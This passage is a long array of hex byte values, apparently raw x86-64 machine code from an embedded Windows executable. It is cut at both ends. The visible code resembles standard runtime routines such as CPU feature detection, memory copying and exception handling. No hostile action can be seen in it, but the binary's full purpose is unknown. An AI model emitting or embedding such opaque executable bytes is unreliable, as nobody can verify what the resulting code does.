0x0, 0x0, 0xe8, 0xa0, 0xd, 0x0, 0x0, 0x48, 0x8b, 0x85, 0xc8, 0x4, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x60, 0xc7, 0x44, 0x24, 0x50, 0x15, 0x0, 0x0, 0x40, 0xc7, 0x44, 0x24, 0x54, 0x1, 0x0, 0x0, 0x0, 0xff, 0x15, 0xd6, 0xd5, 0x0, 0x0, 0x83, 0xf8, 0x1, 0x48, 0x8d, 0x44, 0x24, 0x50, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x8d, 0x45, 0xf0, 0xf, 0x94, 0xc3, 0x48, 0x89, 0x44, 0x24, 0x48, 0x33, 0xc9, 0xff, 0x15, 0xc5, 0xd5, 0x0, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x40, 0xff, 0x15, 0xb2, 0xd5, 0x0, 0x0, 0x85, 0xc0, 0x75, 0xc, 0x84, 0xdb, 0x75, 0x8, 0x8d, 0x48, 0x3, 0xe8, 0xbe, 0xfe, 0xff, 0xff, 0x48, 0x8b, 0x9c, 0x24, 0xd0, 0x5, 0x0, 0x0, 0x48, 0x81, 0xc4, 0xc0, 0x5, 0x0, 0x0, 0x5d, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x1d, 0xaf, 0x52, 0x1, 0x0, 0x48, 0x8d, 0x3d, 0xa8, 0x52, 0x1, 0x0, 0xeb, 0x12, 0x48, 0x8b, 0x3, 0x48, 0x85, 0xc0, 0x74, 0x6, 0xff, 0x15, 0x78, 0xd7, 0x0, 0x0, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x3b, 0xdf, 0x72, 0xe9, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x1d, 0x83, 0x52, 0x1, 0x0, 0x48, 0x8d, 0x3d, 0x7c, 0x52, 0x1, 0x0, 0xeb, 0x12, 0x48, 0x8b, 0x3, 0x48, 0x85, 0xc0, 0x74, 0x6, 0xff, 0x15, 0x3c, 0xd7, 0x0, 0x0, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x3b, 0xdf, 0x72, 0xe9, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xc2, 0x0, 0x0, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x10, 0x33, 0xc0, 0x33, 0xc9, 0xf, 0xa2, 0x44, 0x8b, 0xc1, 0x45, 0x33, 0xdb, 0x44, 0x8b, 0xcb, 0x41, 0x81, 0xf0, 0x6e, 0x74, 0x65, 0x6c, 0x41, 0x81, 0xf1, 0x47, 0x65, 0x6e, 0x75, 0x44, 0x8b, 0xd2, 0x8b, 0xf0, 0x33, 0xc9, 0x41, 0x8d, 0x43, 0x1, 0x45, 0xb, 0xc8, 0xf, 0xa2, 0x41, 0x81, 0xf2, 0x69, 0x6e, 0x65, 0x49, 0x89, 0x4, 0x24, 0x45, 0xb, 0xca, 0x89, 0x5c, 0x24, 0x4, 0x8b, 0xf9, 0x89, 0x4c, 0x24, 0x8, 0x89, 0x54, 0x24, 0xc, 0x75, 0x50, 0x48, 0x83, 0xd, 0x53, 0x75, 0x1, 0x0, 0xff, 0x25, 0xf0, 0x3f, 0xff, 0xf, 0x3d, 0xc0, 0x6, 0x1, 0x0, 0x74, 0x28, 0x3d, 0x60, 0x6, 0x2, 0x0, 0x74, 0x21, 0x3d, 0x70, 0x6, 0x2, 0x0, 0x74, 0x1a, 0x5, 0xb0, 0xf9, 0xfc, 0xff, 0x83, 0xf8, 0x20, 0x77, 0x24, 0x48, 0xb9, 0x1, 0x0, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x48, 0xf, 0xa3, 0xc1, 0x73, 0x14, 0x44, 0x8b, 0x5, 0xe0, 0x7f, 0x1, 0x0, 0x41, 0x83, 0xc8, 0x1, 0x44, 0x89, 0x5, 0xd5, 0x7f, 0x1, 0x0, 0xeb, 0x7, 0x44, 0x8b, 0x5, 0xcc, 0x7f, 0x1, 0x0, 0xb8, 0x7, 0x0, 0x0, 0x0, 0x44, 0x8d, 0x48, 0xfb, 0x3b, 0xf0, 0x7c, 0x26, 0x33, 0xc9, 0xf, 0xa2, 0x89, 0x4, 0x24, 0x44, 0x8b, 0xdb, 0x89, 0x5c, 0x24, 0x4, 0x89, 0x4c, 0x24, 0x8, 0x89, 0x54, 0x24, 0xc, 0xf, 0xba, 0xe3, 0x9, 0x73, 0xa, 0x45, 0xb, 0xc1, 0x44, 0x89, 0x5, 0x99, 0x7f, 0x1, 0x0, 0xc7, 0x5, 0xbf, 0x74, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x44, 0x89, 0xd, 0xbc, 0x74, 0x1, 0x0, 0xf, 0xba, 0xe7, 0x14, 0xf, 0x83, 0x91, 0x0, 0x0, 0x0, 0x44, 0x89, 0xd, 0xa7, 0x74, 0x1, 0x0, 0xbb, 0x6, 0x0, 0x0, 0x0, 0x89, 0x1d, 0xa0, 0x74, 0x1, 0x0, 0xf, 0xba, 0xe7, 0x1b, 0x73, 0x79, 0xf, 0xba, 0xe7, 0x1c, 0x73, 0x73, 0x33, 0xc9, 0xf, 0x1, 0xd0, 0x48, 0xc1, 0xe2, 0x20, 0x48, 0xb, 0xd0, 0x48, 0x89, 0x54, 0x24, 0x20, 0x48, 0x8b, 0x44, 0x24, 0x20, 0x22, 0xc3, 0x3a, 0xc3, 0x75, 0x57, 0x8b, 0x5, 0x72, 0x74, 0x1, 0x0, 0x83, 0xc8, 0x8, 0xc7, 0x5, 0x61, 0x74, 0x1, 0x0, 0x3, 0x0, 0x0, 0x0, 0x89, 0x5, 0x5f, 0x74, 0x1, 0x0, 0x41, 0xf6, 0xc3, 0x20, 0x74, 0x38, 0x83, 0xc8, 0x20, 0xc7, 0x5, 0x48, 0x74, 0x1, 0x0, 0x5, 0x0, 0x0, 0x0, 0x89, 0x5, 0x46, 0x74, 0x1, 0x0, 0xb8, 0x0, 0x0, 0x3, 0xd0, 0x44, 0x23, 0xd8, 0x44, 0x3b, 0xd8, 0x75, 0x18, 0x48, 0x8b, 0x44, 0x24, 0x20, 0x24, 0xe0, 0x3c, 0xe0, 0x75, 0xd, 0x83, 0xd, 0x27, 0x74, 0x1, 0x0, 0x40, 0x89, 0x1d, 0x1d, 0x74, 0x1, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x28, 0x33, 0xc0, 0x48, 0x8b, 0x74, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x10, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xc3, 0xcc, 0xcc, 0x33, 0xc0, 0x39, 0x5, 0xe0, 0x8f, 0x1, 0x0, 0xf, 0x95, 0xc0, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x57, 0x56, 0x48, 0x8b, 0xf9, 0x48, 0x8b, 0xf2, 0x49, 0x8b, 0xc8, 0xf3, 0xa4, 0x5e, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xc1, 0x4c, 0x8d, 0x15, 0x66, 0xe2, 0xff, 0xff, 0x49, 0x83, 0xf8, 0xf, 0xf, 0x87, 0xc, 0x1, 0x0, 0x0, 0x66, 0x66, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x47, 0x8b, 0x8c, 0x82, 0x0, 0xc0, 0x1, 0x0, 0x4d, 0x3, 0xca, 0x41, 0xff, 0xe1, 0xc3, 0x90, 0x4c, 0x8b, 0x2, 0x8b, 0x4a, 0x8, 0x44, 0xf, 0xb7, 0x4a, 0xc, 0x44, 0xf, 0xb6, 0x52, 0xe, 0x4c, 0x89, 0x0, 0x89, 0x48, 0x8, 0x66, 0x44, 0x89, 0x48, 0xc, 0x44, 0x88, 0x50, 0xe, 0xc3, 0x4c, 0x8b, 0x2, 0xf, 0xb7, 0x4a, 0x8, 0x44, 0xf, 0xb6, 0x4a, 0xa, 0x4c, 0x89, 0x0, 0x66, 0x89, 0x48, 0x8, 0x44, 0x88, 0x48, 0xa, 0xc3, 0xf, 0xb7, 0xa, 0x66, 0x89, 0x8, 0xc3, 0x90, 0x8b, 0xa, 0x44, 0xf, 0xb7, 0x42, 0x4, 0x44, 0xf, 0xb6, 0x4a, 0x6, 0x89, 0x8, 0x66, 0x44, 0x89, 0x40, 0x4, 0x44, 0x88, 0x48, 0x6, 0xc3, 0x4c, 0x8b, 0x2, 0x8b, 0x4a, 0x8, 0x44, 0xf, 0xb7, 0x4a, 0xc, 0x4c, 0x89, 0x0, 0x89, 0x48, 0x8, 0x66, 0x44, 0x89, 0x48, 0xc, 0xc3, 0xf, 0xb7, 0xa, 0x44, 0xf, 0xb6, 0x42, 0x2, 0x66, 0x89, 0x8, 0x44, 0x88, 0x40, 0x2, 0xc3, 0x90, 0x4c, 0x8b, 0x2, 0x8b, 0x4a, 0x8, 0x44, 0xf, 0xb6, 0x4a, 0xc, 0x4c, 0x89, 0x0, 0x89, 0x48, 0x8, 0x44, 0x88, 0x48, 0xc, 0xc3, 0x4c, 0x8b, 0x2, 0xf, 0xb7, 0x4a, 0x8, 0x4c, 0x89, 0x0, 0x66, 0x89, 0x48, 0x8, 0xc3, 0x4c, 0x8b, 0x2, 0xf, 0xb6, 0x4a, 0x8, 0x4c, 0x89, 0x0, 0x88, 0x48, 0x8, 0xc3, 0x4c, 0x8b, 0x2, 0x8b, 0x4a, 0x8, 0x4c, 0x89, 0x0, 0x89, 0x48, 0x8, 0xc3, 0x8b, 0xa, 0x44, 0xf, 0xb7, 0x42, 0x4, 0x89, 0x8, 0x66, 0x44, 0x89, 0x40, 0x4, 0xc3, 0x8b, 0xa, 0x44, 0xf, 0xb6, 0x42, 0x4, 0x89, 0x8, 0x44, 0x88, 0x40, 0x4, 0xc3, 0x48, 0x8b, 0xa, 0x48, 0x89, 0x8, 0xc3, 0xf, 0xb6, 0xa, 0x88, 0x8, 0xc3, 0x8b, 0xa, 0x89, 0x8, 0xc3, 0x90, 0x49, 0x83, 0xf8, 0x20, 0x77, 0x17, 0xf3, 0xf, 0x6f, 0xa, 0xf3, 0x42, 0xf, 0x6f, 0x54, 0x2, 0xf0, 0xf3, 0xf, 0x7f, 0x9, 0xf3, 0x42, 0xf, 0x7f, 0x54, 0x1, 0xf0, 0xc3, 0x48, 0x3b, 0xd1, 0x73, 0xe, 0x4e, 0x8d, 0xc, 0x2, 0x49, 0x3b, 0xc9, 0xf, 0x82, 0x41, 0x4, 0x0, 0x0, 0x90, 0x83, 0x3d, 0x61, 0x72, 0x1, 0x0, 0x3, 0xf, 0x82, 0xe3, 0x2, 0x0, 0x0, 0x49, 0x81, 0xf8, 0x0, 0x20, 0x0, 0x0, 0x76, 0x16, 0x49, 0x81, 0xf8, 0x0, 0x0, 0x18, 0x0, 0x77, 0xd, 0xf6, 0x5, 0x12, 0x7d, 0x1, 0x0, 0x2, 0xf, 0x85, 0x64, 0xfe, 0xff, 0xff, 0xc5, 0xfe, 0x6f, 0x2, 0xc4, 0xa1, 0x7e, 0x6f, 0x6c, 0x2, 0xe0, 0x49, 0x81, 0xf8, 0x0, 0x1, 0x0, 0x0, 0xf, 0x86, 0xc4, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xc9, 0x49, 0x83, 0xe1, 0x1f, 0x49, 0x83, 0xe9, 0x20, 0x49, 0x2b, 0xc9, 0x49, 0x2b, 0xd1, 0x4d, 0x3, 0xc1, 0x49, 0x81, 0xf8, 0x0, 0x1, 0x0, 0x0, 0xf, 0x86, 0xa3, 0x0, 0x0, 0x0, 0x49, 0x81, 0xf8, 0x0, 0x0, 0x18, 0x0, 0xf, 0x87, 0x3e, 0x1, 0x0, 0x0, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc5, 0xfe, 0x6f, 0xa, 0xc5, 0xfe, 0x6f, 0x52, 0x20, 0xc5, 0xfe, 0x6f, 0x5a, 0x40, 0xc5, 0xfe, 0x6f, 0x62, 0x60, 0xc5, 0xfd, 0x7f, 0x9, 0xc5, 0xfd, 0x7f, 0x51, 0x20, 0xc5, 0xfd, 0x7f, 0x59, 0x40, 0xc5, 0xfd, 0x7f, 0x61, 0x60, 0xc5, 0xfe, 0x6f, 0x8a, 0x80, 0x0, 0x0, 0x0, 0xc5, 0xfe, 0x6f, 0x92, 0xa0, 0x0, 0x0, 0x0, 0xc5, 0xfe, 0x6f, 0x9a, 0xc0, 0x0, 0x0, 0x0, 0xc5, 0xfe, 0x6f, 0xa2, 0xe0, 0x0, 0x0, 0x0, 0xc5, 0xfd, 0x7f, 0x89, 0x80, 0x0, 0x0, 0x0, 0xc5, 0xfd, 0x7f, 0x91, 0xa0, 0x0, 0x0, 0x0, 0xc5, 0xfd, 0x7f, 0x99, 0xc0, 0x0, 0x0, 0x0, 0xc5, 0xfd, 0x7f, 0xa1, 0xe0, 0x0, 0x0, 0x0, 0x48, 0x81, 0xc1, 0x0, 0x1, 0x0, 0x0, 0x48, 0x81, 0xc2, 0x0, 0x1, 0x0, 0x0, 0x49, 0x81, 0xe8, 0x0, 0x1, 0x0, 0x0, 0x49, 0x81, 0xf8, 0x0, 0x1, 0x0, 0x0, 0xf, 0x83, 0x78, 0xff, 0xff, 0xff, 0x4d, 0x8d, 0x48, 0x1f, 0x49, 0x83, 0xe1, 0xe0, 0x4d, 0x8b, 0xd9, 0x49, 0xc1, 0xeb, 0x5, 0x47, 0x8b, 0x9c, 0x9a, 0x40, 0xc0, 0x1, 0x0, 0x4d, 0x3, 0xda, 0x41, 0xff, 0xe3, 0xc4, 0xa1, 0x7e, 0x6f, 0x8c, 0xa, 0x0, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7e, 0x7f, 0x8c, 0x9, 0x0, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7e, 0x6f, 0x8c, 0xa, 0x20, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7e, 0x7f, 0x8c, 0x9, 0x20, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7e, 0x6f, 0x8c, 0xa, 0x40, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7e, 0x7f, 0x8c, 0x9, 0x40, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7e, 0x6f, 0x8c, 0xa, 0x60, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7e, 0x7f, 0x8c, 0x9, 0x60, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7e, 0x6f, 0x4c, 0xa, 0x80, 0xc4, 0xa1, 0x7e, 0x7f, 0x4c, 0x9, 0x80, 0xc4, 0xa1, 0x7e, 0x6f, 0x4c, 0xa, 0xa0, 0xc4, 0xa1, 0x7e, 0x7f, 0x4c, 0x9, 0xa0, 0xc4, 0xa1, 0x7e, 0x6f, 0x4c, 0xa, 0xc0, 0xc4, 0xa1, 0x7e, 0x7f, 0x4c, 0x9, 0xc0, 0xc4, 0xa1, 0x7e, 0x7f, 0x6c, 0x1, 0xe0, 0xc5, 0xfe, 0x7f, 0x0, 0xc5, 0xf8, 0x77, 0xc3, 0x66, 0x90, 0xc5, 0xfe, 0x6f, 0xa, 0xc5, 0xfe, 0x6f, 0x52, 0x20, 0xc5, 0xfe, 0x6f, 0x5a, 0x40, 0xc5, 0xfe, 0x6f, 0x62, 0x60, 0xc5, 0xfd, 0xe7, 0x9, 0xc5, 0xfd, 0xe7, 0x51, 0x20, 0xc5, 0xfd, 0xe7, 0x59, 0x40, 0xc5, 0xfd, 0xe7, 0x61, 0x60, 0xc5, 0xfe, 0x6f, 0x8a, 0x80, 0x0, 0x0, 0x0, 0xc5, 0xfe, 0x6f, 0x92, 0xa0, 0x0, 0x0, 0x0, 0xc5, 0xfe, 0x6f, 0x9a, 0xc0, 0x0, 0x0, 0x0, 0xc5, 0xfe, 0x6f, 0xa2, 0xe0, 0x0, 0x0, 0x0, 0xc5, 0xfd, 0xe7, 0x89, 0x80, 0x0, 0x0, 0x0, 0xc5, 0xfd, 0xe7, 0x91, 0xa0, 0x0, 0x0, 0x0, 0xc5, 0xfd, 0xe7, 0x99, 0xc0, 0x0, 0x0, 0x0, 0xc5, 0xfd, 0xe7, 0xa1, 0xe0, 0x0, 0x0, 0x0, 0x48, 0x81, 0xc1, 0x0, 0x1, 0x0, 0x0, 0x48, 0x81, 0xc2, 0x0, 0x1, 0x0, 0x0, 0x49, 0x81, 0xe8, 0x0, 0x1, 0x0, 0x0, 0x49, 0x81, 0xf8, 0x0, 0x1, 0x0, 0x0, 0xf, 0x83, 0x78, 0xff, 0xff, 0xff, 0x4d, 0x8d, 0x48, 0x1f, 0x49, 0x83, 0xe1, 0xe0, 0x4d, 0x8b, 0xd9, 0x49, 0xc1, 0xeb, 0x5, 0x47, 0x8b, 0x9c, 0x9a, 0x64, 0xc0, 0x1, 0x0, 0x4d, 0x3, 0xda, 0x41, 0xff, 0xe3, 0xc4, 0xa1, 0x7e, 0x6f, 0x8c, 0xa, 0x0, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7d, 0xe7, 0x8c, 0x9, 0x0, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7e, 0x6f, 0x8c, 0xa, 0x20, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7d, 0xe7, 0x8c, 0x9, 0x20, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7e, 0x6f, 0x8c, 0xa, 0x40, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7d, 0xe7, 0x8c, 0x9, 0x40, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7e, 0x6f, 0x8c, 0xa, 0x60, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7d, 0xe7, 0x8c, 0x9, 0x60, 0xff, 0xff, 0xff, 0xc4, 0xa1, 0x7e, 0x6f, 0x4c, 0xa, 0x80, 0xc4, 0xa1, 0x7d, 0xe7, 0x4c, 0x9, 0x80, 0xc4, 0xa1, 0x7e, 0x6f, 0x4c, 0xa, 0xa0, 0xc4, 0xa1, 0x7d, 0xe7, 0x4c, 0x9, 0xa0, 0xc4, 0xa1, 0x7e, 0x6f, 0x4c, 0xa, 0xc0, 0xc4, 0xa1, 0x7d, 0xe7, 0x4c, 0x9, 0xc0, 0xc4, 0xa1, 0x7e, 0x7f, 0x6c, 0x1, 0xe0, 0xc5, 0xfe, 0x7f, 0x0, 0xf, 0xae, 0xf8, 0xc5, 0xf8, 0x77, 0xc3, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x49, 0x81, 0xf8, 0x0, 0x8, 0x0, 0x0, 0x76, 0xd, 0xf6, 0x5, 0x38, 0x7a, 0x1, 0x0, 0x2, 0xf, 0x85, 0x8a, 0xfb, 0xff, 0xff, 0xf3, 0xf, 0x6f, 0x2, 0xf3, 0x42, 0xf, 0x6f, 0x6c, 0x2, 0xf0, 0x49, 0x81, 0xf8, 0x80, 0x0, 0x0, 0x0, 0xf, 0x86, 0x8e, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xc9, 0x49, 0x83, 0xe1, 0xf, 0x49, 0x83, 0xe9, 0x10, 0x49, 0x2b, 0xc9, 0x49, 0x2b, 0xd1, 0x4d, 0x3, 0xc1, 0x49, 0x81, 0xf8, 0x80, 0x0, 0x0, 0x0, 0x76, 0x71, 0xf, 0x1f, 0x44, 0x0, 0x0, 0xf3, 0xf, 0x6f, 0xa, 0xf3, 0xf, 0x6f, 0x52, 0x10, 0xf3, 0xf, 0x6f, 0x5a, 0x20, 0xf3, 0xf, 0x6f, 0x62, 0x30, 0x66, 0xf, 0x7f, 0x9, 0x66, 0xf, 0x7f, 0x51, 0x10, 0x66, 0xf, 0x7f, 0x59, 0x20, 0x66, 0xf, 0x7f, 0x61, 0x30, 0xf3, 0xf, 0x6f, 0x4a, 0x40, 0xf3, 0xf, 0x6f, 0x52, 0x50, 0xf3, 0xf, 0x6f, 0x5a, 0x60, 0xf3, 0xf, 0x6f, 0x62, 0x70, 0x66, 0xf, 0x7f, 0x49, 0x40, 0x66, 0xf, 0x7f, 0x51, 0x50, 0x66, 0xf, 0x7f, 0x59, 0x60, 0x66, 0xf, 0x7f, 0x61, 0x70, 0x48, 0x81, 0xc1, 0x80, 0x0, 0x0, 0x0, 0x48, 0x81, 0xc2, 0x80, 0x0, 0x0, 0x0, 0x49, 0x81, 0xe8, 0x80, 0x0, 0x0, 0x0, 0x49, 0x81, 0xf8, 0x80, 0x0, 0x0, 0x0, 0x73, 0x94, 0x4d, 0x8d, 0x48, 0xf, 0x49, 0x83, 0xe1, 0xf0, 0x4d, 0x8b, 0xd9, 0x49, 0xc1, 0xeb, 0x4, 0x47, 0x8b, 0x9c, 0x9a, 0x88, 0xc0, 0x1, 0x0, 0x4d, 0x3, 0xda, 0x41, 0xff, 0xe3, 0xf3, 0x42, 0xf, 0x6f, 0x4c, 0xa, 0x80, 0xf3, 0x42, 0xf, 0x7f, 0x4c, 0x9, 0x80, 0xf3, 0x42, 0xf, 0x6f, 0x4c, 0xa, 0x90, 0xf3, 0x42, 0xf, 0x7f, 0x4c, 0x9, 0x90, 0xf3, 0x42, 0xf, 0x6f, 0x4c, 0xa, 0xa0, 0xf3, 0x42, 0xf, 0x7f, 0x4c, 0x9, 0xa0, 0xf3, 0x42, 0xf, 0x6f, 0x4c, 0xa, 0xb0, 0xf3, 0x42, 0xf, 0x7f, 0x4c, 0x9, 0xb0, 0xf3, 0x42, 0xf, 0x6f, 0x4c, 0xa, 0xc0, 0xf3, 0x42, 0xf, 0x7f, 0x4c, 0x9, 0xc0, 0xf3, 0x42, 0xf, 0x6f, 0x4c, 0xa, 0xd0, 0xf3, 0x42, 0xf, 0x7f, 0x4c, 0x9, 0xd0, 0xf3, 0x42, 0xf, 0x6f, 0x4c, 0xa, 0xe0, 0xf3, 0x42, 0xf, 0x7f, 0x4c, 0x9, 0xe0, 0xf3, 0x42, 0xf, 0x7f, 0x6c, 0x1, 0xf0, 0xf3, 0xf, 0x7f, 0x0, 0xc3, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xd9, 0x4c, 0x8b, 0xd2, 0x48, 0x2b, 0xd1, 0x49, 0x3, 0xc8, 0xf, 0x10, 0x44, 0x11, 0xf0, 0x48, 0x83, 0xe9, 0x10, 0x49, 0x83, 0xe8, 0x10, 0xf6, 0xc1, 0xf, 0x74, 0x17, 0x48, 0x8b, 0xc1, 0x48, 0x83, 0xe1, 0xf0, 0xf, 0x10, 0xc8, 0xf, 0x10, 0x4, 0x11, 0xf, 0x11, 0x8, 0x4c, 0x8b, 0xc1, 0x4d, 0x2b, 0xc3, 0x4d, 0x8b, 0xc8, 0x49, 0xc1, 0xe9, 0x7, 0x74, 0x6f, 0xf, 0x29, 0x1, 0xeb, 0x14, 0x66, 0x66, 0x66, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf, 0x29, 0x41, 0x10, 0xf, 0x29, 0x9, 0xf, 0x10, 0x44, 0x11, 0xf0, 0xf, 0x10, 0x4c, 0x11, 0xe0, 0x48, 0x81, 0xe9, 0x80, 0x0, 0x0, 0x0, 0xf, 0x29, 0x41, 0x70, 0xf, 0x29, 0x49, 0x60, 0xf, 0x10, 0x44, 0x11, 0x50, 0xf, 0x10, 0x4c, 0x11, 0x40, 0x49, 0xff, 0xc9, 0xf, 0x29, 0x41, 0x50, 0xf, 0x29, 0x49, 0x40, 0xf, 0x10, 0x44, 0x11, 0x30, 0xf, 0x10, 0x4c, 0x11, 0x20, 0xf, 0x29, 0x41, 0x30, 0xf, 0x29, 0x49, 0x20, 0xf, 0x10, 0x44, 0x11, 0x10, 0xf, 0x10, 0xc, 0x11, 0x75, 0xae, 0xf, 0x29, 0x41, 0x10, 0x49, 0x83, 0xe0, 0x7f, 0xf, 0x28, 0xc1, 0x4d, 0x8b, 0xc8, 0x49, 0xc1, 0xe9, 0x4, 0x74, 0x1a, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf, 0x11, 0x1, 0x48, 0x83, 0xe9, 0x10, 0xf, 0x10, 0x4, 0x11, 0x49, 0xff, 0xc9, 0x75, 0xf0, 0x49, 0x83, 0xe0, 0xf, 0x74, 0x8, 0x41, 0xf, 0x10, 0xa, 0x41, 0xf, 0x11, 0xb, 0xf, 0x11, 0x1, 0x49, 0x8b, 0xc3, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8b, 0xe9, 0x4d, 0x8b, 0xf9, 0x49, 0x8b, 0xc8, 0x49, 0x8b, 0xf8, 0x4c, 0x8b, 0xea, 0xe8, 0xec, 0x5, 0x0, 0x0, 0x4d, 0x8b, 0x67, 0x8, 0x4d, 0x8b, 0x37, 0x49, 0x8b, 0x5f, 0x38, 0x4d, 0x2b, 0xf4, 0xf6, 0x45, 0x4, 0x66, 0x41, 0x8b, 0x77, 0x48, 0xf, 0x85, 0xdc, 0x0, 0x0, 0x0, 0x48, 0x89, 0x6c, 0x24, 0x30, 0x48, 0x89, 0x7c, 0x24, 0x38, 0x3b, 0x33, 0xf, 0x83, 0x8a, 0x1, 0x0, 0x0, 0x8b, 0xfe, 0x48, 0x3, 0xff, 0x8b, 0x44, 0xfb, 0x4, 0x4c, 0x3b, 0xf0, 0xf, 0x82, 0xaa, 0x0, 0x0, 0x0, 0x8b, 0x44, 0xfb, 0x8, 0x4c, 0x3b, 0xf0, 0xf, 0x83, 0x9d, 0x0, 0x0, 0x0, 0x83, 0x7c, 0xfb, 0x10, 0x0, 0xf, 0x84, 0x92, 0x0, 0x0, 0x0, 0x83, 0x7c, 0xfb, 0xc, 0x1, 0x74, 0x17, 0x8b, 0x44, 0xfb, 0xc, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0x49, 0x3, 0xc4, 0x49, 0x8b, 0xd5, 0xff, 0xd0, 0x85, 0xc0, 0x78, 0x7d, 0x7e, 0x74, 0x81, 0x7d, 0x0, 0x63, 0x73, 0x6d, 0xe0, 0x75, 0x28, 0x48, 0x83, 0x3d, 0xb1, 0xce, 0x0, 0x0, 0x0, 0x74, 0x1e, 0x48, 0x8d, 0xd, 0xa8, 0xce, 0x0, 0x0, 0xe8, 0xa3, 0xb9, 0x0, 0x0, 0x85, 0xc0, 0x74, 0xe, 0xba, 0x1, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xcd, 0xff, 0x15, 0x91, 0xce, 0x0, 0x0, 0x8b, 0x4c, 0xfb, 0x10, 0x41, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x49, 0x3, 0xcc, 0x49, 0x8b, 0xd5, 0xe8, 0xfc, 0x4, 0x0, 0x0, 0x49, 0x8b, 0x47, 0x40, 0x4c, 0x8b, 0xc5, 0x8b, 0x54, 0xfb, 0x10, 0x49, 0x8b, 0xcd, 0x44, 0x8b, 0x4d, 0x0, 0x49, 0x3, 0xd4, 0x48, 0x89, 0x44, 0x24, 0x28, 0x49, 0x8b, 0x47, 0x28, 0x48, 0x89, 0x44, 0x24, 0x20, 0xff, 0x15, 0xc3, 0xcb, 0x0, 0x0, 0xe8, 0xfe, 0x4, 0x0, 0x0, 0xff, 0xc6, 0xe9, 0x35, 0xff, 0xff, 0xff, 0x33, 0xc0, 0xe9, 0xc5, 0x0, 0x0, 0x0, 0x49, 0x8b, 0x7f, 0x20, 0x44, 0x8b, 0xb, 0x49, 0x2b, 0xfc, 0x41, 0x3b, 0xf1, 0xf, 0x83, 0xad, 0x0, 0x0, 0x0, 0x45, 0x8b, 0xc1, 0x8b, 0xd6, 0x41, 0x8b, 0xc8, 0x48, 0x3, 0xd2, 0x8b, 0x44, 0xd3, 0x4, 0x4c, 0x3b, 0xf0, 0xf, 0x82, 0x88, 0x0, 0x0, 0x0, 0x8b, 0x44, 0xd3, 0x8, 0x4c, 0x3b, 0xf0, 0x73, 0x7f, 0x44, 0x8b, 0x5d, 0x4, 0x41, 0x83, 0xe3, 0x20, 0x74, 0x44, 0x45, 0x33, 0xd2, 0x45, 0x85, 0xc0, 0x74, 0x34, 0x41, 0x8b, 0xca, 0x48, 0x3, 0xc9, 0x8b, 0x44, 0xcb, 0x4, 0x48, 0x3b, 0xf8, 0x72, 0x1d, 0x8b, 0x44, 0xcb, 0x8, 0x48, 0x3b, 0xf8, 0x73, 0x14, 0x8b, 